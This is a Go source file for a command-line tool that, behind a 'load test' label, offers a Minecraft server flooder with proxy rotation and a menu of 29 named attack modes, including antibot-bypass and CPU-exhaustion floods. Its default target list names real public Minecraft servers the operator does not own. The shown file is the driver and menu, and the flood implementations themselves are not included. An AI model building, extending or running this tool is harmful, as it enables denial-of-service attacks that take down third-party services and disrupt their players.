package main

import (
	"fmt"
	"os"
	"strconv"
	"strings"
	"time"
)

func main() {
	fmt.Println("SERVER LASTTEST & MINECRAFT PINGER")
	fmt.Println(strings.Repeat("=", 60))

	// Wähle Test-Modus
	testMode := selectTestMode()

	if testMode == "minecraft" {
		runMinecraftPinger()
		return
	}

	// Normaler Load-Test
	proxies, useRotating := configureProxies()

	targetServer, concurrency, rps, duration, err := getServerConfig()
	if err != nil {
		fmt.Printf("Fehler bei der Server-Konfiguration: %v\n", err)
		os.Exit(1)
	}

	tester, err := NewLoadTester(targetServer, concurrency, rps, duration)
	if err != nil {
		fmt.Printf("Fehler beim Erstellen des Load Testers: %v\n", err)
		os.Exit(1)
	}

	tester.useRotating = useRotating

	if len(proxies) > 0 {
		var addErrors []string
		for _, p := range proxies {
			err := tester.AddProxy(p.Protocol, p.Host, p.Port, p.Username, p.Password, "")
			if err != nil {
				addErrors = append(addErrors, fmt.Sprintf("Proxy %s:%s - %v", p.Host, p.Port, err))
			}
		}

		if len(addErrors) > 0 {
			fmt.Println("Proxy-Fehler:")
			for _, errMsg := range addErrors {
				fmt.Printf("  - %s\n", errMsg)
			}
		}

		if len(tester.proxies) == 0 {
			fmt.Println("Keine gültigen Proxys verfügbar - verwende direkte Verbindung")
		}
	}

	fmt.Println("\n" + strings.Repeat("=", 60))
	tester.Start()
}

func selectTestMode() string {
	fmt.Println("TEST MODUS AUSWAHL")
	fmt.Println(strings.Repeat("=", 30))
	fmt.Println("1. Normaler Load-Test")
	fmt.Println("2. Minecraft Server Flooder")

	choice := promptUser("Wähle Modus (1-2) [1]: ")

	switch choice {
	case "2":
		return "minecraft"
	default:
		return "loadtest"
	}
}

func runMinecraftPinger() {
	fmt.Println("\nMINECRAFT SERVER FLOODER")
	fmt.Println(strings.Repeat("=", 50))

	// Proxy-Konfiguration
	proxies, useRotating := configureProxies()

	// Server-Liste konfigurieren
	servers := configureMinecraftServers()
	if len(servers) == 0 {
		fmt.Println("Keine Server konfiguriert")
		return
	}

	// Flood-Typ auswählen
	floodType := selectFloodType()

	// Worker-Anzahl
	concurrencyStr := promptUser("Anzahl Worker [10]: ")
	concurrency := 10
	if concurrencyStr != "" {
		if c, err := strconv.Atoi(concurrencyStr); err == nil && c > 0 {
			concurrency = c
		}
	}

	// Floods pro Sekunde
	rpsStr := promptUser("Floods pro Sekunde [50]: ")
	rps := 50
	if rpsStr != "" {
		if r, err := strconv.Atoi(rpsStr); err == nil && r > 0 {
			rps = r
		}
	}

	// Testdauer
	durationStr := promptUser("Testdauer in Sekunden [30]: ")
	duration := 30 * time.Second
	if durationStr != "" {
		if d, err := strconv.Atoi(durationStr); err == nil && d > 0 {
			duration = time.Duration(d) * time.Second
		}
	}

	fmt.Printf("\nStarte Minecraft Server Flooder...\n")
	fmt.Printf("Server: %d, Worker: %d, Floods/s: %d, Dauer: %v, Typ: %s\n",
		len(servers), concurrency, rps, duration, floodType)
	fmt.Printf("Proxys: %d (Rotation: %v)\n", len(proxies), useRotating)
	fmt.Println(strings.Repeat("=", 60))

	// Minecraft-Flooder erstellen
	flooder := NewMinecraftFlooder(servers, proxies, useRotating, concurrency, duration, floodType)
	flooder.Start()
}

func selectFloodType() string {
	fmt.Println("\nFLOOD-TYP AUSWAHL")
	fmt.Println(strings.Repeat("-", 30))
	// Anzeige der Optionen in Kategorien
	fmt.Println("  1. Localhost Attack")
	fmt.Println("  2. Name Null Ping")
	fmt.Println("  3. Boss Handler")
	fmt.Println("  4. Fake Premium Join")
	fmt.Println("  5. Bot Null Ping")
	fmt.Println("  6. Ultra Join")
	fmt.Println("  7. UFO Attack")
	fmt.Println("  8. nAntibot")
	fmt.Println("  9. 2LS Bypass")
	fmt.Println("  10. Multi Killer")
	fmt.Println("  11. Aegis Killer")
	fmt.Println("  12. CPU Lagger")
	fmt.Println("  13. Destroyer")
	fmt.Println("  14. ID Error")
	fmt.Println("  15. Fake Host")
	fmt.Println("  16. Pro Auth Killer")
	fmt.Println("  17. Standard Flood")
	fmt.Println("  18. Join Bots")
	fmt.Println("  19. Bot Fucker")
	fmt.Println("  20. Consola")
	fmt.Println("  21. Paola")
	fmt.Println("  22. TimeOut Killer")
	fmt.Println("  23. CPU Burner 6")
	fmt.Println("  24. CPU Ripper")
	fmt.Println("  25. Fake Join")
	fmt.Println("  26. Fast Join")
	fmt.Println("  27. MOTD Killer")
	fmt.Println("  28. Legacy MOTD")
	fmt.Println("  29. Byte Attack")

	floodTypes := map[string]string{
		"1":  "localhost",
		"2":  "namenullping",
		"3":  "bosshandler",
		"4":  "fakepremium_join",
		"5":  "botnullping",
		"6":  "ultrajoin",
		"7":  "ufo",
		"8":  "nAntibot",
		"9":  "2lsbypass",
		"10": "multikiller",
		"11": "aegiskiller",
		"12": "cpulagger",
		"13": "destroyer",
		"14": "IDERROR",
		"15": "fakehost",
		"16": "proauthkiller",
		"17": "flood",
		"18": "joinbots",
		"19": "botfucker",
		"20": "consola",
		"21": "paola",
		"22": "TimeOutKiller",
		"23": "cpuburner6",
		"24": "cpuRipper",
		"25": "fakejoin",
		"26": "fastjoin",
		"27": "motdkiller",
		"28": "legacy_motd",
		"29": "byte",
	}

	choice := promptUser("Wähle Flood-Typ (1-15) [6]: ")
	if choice == "" {
		choice = "6"
	}

	if floodType, exists := floodTypes[choice]; exists {
		return floodType
	}

	return "ultrajoin"
}

func configureMinecraftServers() []string {
	fmt.Println("\nSERVER KONFIGURATION")
	fmt.Println(strings.Repeat("-", 30))
	fmt.Println("1. Standard Server verwenden")
	fmt.Println("2. Eigene Server eingeben")

	choice := promptUser("Wähle Option (1-2) [1]: ")

	if choice == "2" {
		var servers []string
		fmt.Println("\nGib Minecraft Server ein (Format: host:port oder nur host)")
		fmt.Println("Leere Zeile zum Beenden:")

		for {
			server := promptUser(fmt.Sprintf("Server #%d: ", len(servers)+1))
			if server == "" {
				break
			}
			servers = append(servers, server)
		}

		return servers
	}

	// Standard Server
	return []string{
		"hypixel.net",
		"mc.hypixel.net",
		"2b2t.org",
		"mineplex.com",
		"gommehd.net",
		"cubecraft.net",
	}
}
